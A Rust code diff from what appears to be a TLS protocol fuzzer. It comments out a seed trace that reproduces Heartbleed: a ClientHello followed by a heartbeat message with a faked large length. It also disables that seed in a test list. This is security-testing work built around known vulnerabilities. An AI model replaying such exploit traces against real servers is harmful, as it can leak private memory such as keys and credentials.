@@ -392,56 +392,56 @@ pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TLSProtocolTypes> {
     trace
 }
 
-pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
-    let client_hello = term! {
-          fn_client_hello(
-            fn_protocol_version12,
-            fn_new_random,
-            fn_new_session_id,
-            (fn_cipher_suites_make(
-                (fn_append_cipher_suite(
-                (fn_new_cipher_suites()),
-                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
-                fn_cipher_suite12
-            )))),
-            fn_compressions,
-            (fn_client_extensions_make(
-            (fn_client_extensions_append(
-                (fn_client_extensions_append(
-                    (fn_client_extensions_append(
-                        fn_client_extensions_new,
-                        (fn_support_group_extension(fn_named_group_secp384r1))
-                    )),
-                    fn_ec_point_formats_extension
-                )),
-                fn_signed_certificate_timestamp_extension
-            ))
-        )))
-    };
-
-    Trace {
-        prior_traces: vec![],
-        descriptors: vec![
-            TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
-            TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
-        ],
-        steps: vec![
-            Step {
-                agent: server,
-                action: Action::Input(input_action! { client_hello
-                }),
-            },
-            // Send directly after client_hello such that this does not need to be encrypted
-            Step {
-                agent: server,
-                action: Action::Input(input_action! { term! {
-                        fn_heartbeat_fake_length((fn_payload_u16(fn_empty_bytes_vec)), fn_large_length)
-                    }
-                }),
-            },
-        ],
-    }
-}
+// pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
+//     let client_hello = term! {
+//           fn_client_hello(
+//             fn_protocol_version12,
+//             fn_new_random,
+//             fn_new_session_id,
+//             (fn_cipher_suites_make(
+//                 (fn_append_cipher_suite(
+//                 (fn_new_cipher_suites()),
+//                 // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+//                 fn_cipher_suite12
+//             )))),
+//             fn_compressions,
+//             (fn_client_extensions_make(
+//             (fn_client_extensions_append(
+//                 (fn_client_extensions_append(
+//                     (fn_client_extensions_append(
+//                         fn_client_extensions_new,
+//                         (fn_support_group_extension(fn_named_group_secp384r1))
+//                     )),
+//                     fn_ec_point_formats_extension
+//                 )),
+//                 fn_signed_certificate_timestamp_extension
+//             ))
+//         )))
+//     };
+//
+//     Trace {
+//         prior_traces: vec![],
+//         descriptors: vec![
+//             TLSDescriptorConfig::new_client(client, TLSVersion::V1_2),
+//             TLSDescriptorConfig::new_server(server, TLSVersion::V1_2),
+//         ],
+//         steps: vec![
+//             Step {
+//                 agent: server,
+//                 action: Action::Input(input_action! { client_hello
+//                 }),
+//             },
+//             // Send directly after client_hello such that this does not need to be encrypted
+//             Step {
+//                 agent: server,
+//                 action: Action::Input(input_action! { term! {
+//                         fn_heartbeat_fake_length((fn_payload_u16(fn_empty_bytes_vec)),
+// fn_large_length)                     }
+//                 }),
+//             },
+//         ],
+//     }
+// }
 
 pub fn seed_freak(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
     Trace {
@@ -1120,7 +1120,7 @@ pub mod tests {
             seed_cve_2022_25638.build_named_trace(),
             seed_cve_2022_25640.build_named_trace(),
             seed_cve_2021_3449.build_named_trace(),
-            seed_heartbleed.build_named_trace(),
+            // seed_heartbleed.build_named_trace(),
             seed_freak.build_named_trace(),
             seed_cve_2022_25640_simple.build_named_trace(),
             seed_cve_2022_38153.build_named_trace(),
